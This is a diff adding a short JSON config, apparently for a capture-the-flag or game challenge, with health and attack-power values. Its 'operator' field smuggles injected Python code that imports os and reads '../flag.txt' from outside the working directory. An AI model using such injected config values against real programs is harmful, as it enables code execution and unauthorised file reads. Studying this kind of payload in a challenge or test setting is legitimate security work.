@@ -1,0 +1,5 @@
+{
+    "current_health": 1,
+    "attack_power": 0.001,
+    "operator": "\nimport os\nfrom pathlib import Path\nresult = Path('../flag.txt').read_text()\na="
+}
